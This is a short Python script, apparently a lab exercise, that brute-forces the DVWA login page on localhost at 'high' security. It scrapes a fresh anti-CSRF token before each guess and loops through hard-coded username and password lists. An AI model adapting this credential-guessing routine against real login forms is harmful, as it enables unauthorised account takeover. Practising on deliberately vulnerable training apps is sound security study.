import requests
from bs4 import BeautifulSoup

target = "http://localhost/DVWA/vulnerabilities/brute/"
payload = {"username": None, "password": None, "Login": "Login", "user_token": None}
cookie = {"security": "high", "PHPSESSID": "d5tc1vkj3cp7d2ca0rn2m8dhq1"}

username_list = ["root", "admin", "pablo"]
password_list = ["123456", "toor", "pass", "password", "letmein"]

for username in username_list:
	for password in password_list:
		with requests.Session() as s:
			req1 = s.get(url=target,cookies=cookie)
			soup = BeautifulSoup(req1.content, "html.parser")
			raw_token = soup.find(attrs={"name": "user_token"})
			raw_token = str(raw_token).split()[3]
			token = raw_token.replace("value=\"","").replace("\">","")
			payload["username"] = username
			payload["password"] = password
			payload["user_token"] = token
			req2 = s.get(url=target, params=payload, cookies=cookie)
			req2 = str(req2.content)
			if "Username and/or password incorrect." in req2:
				print("{}:{} is wrong match.".format(username, password))
			else:
				print("{}:{} is right match.".format(username, password))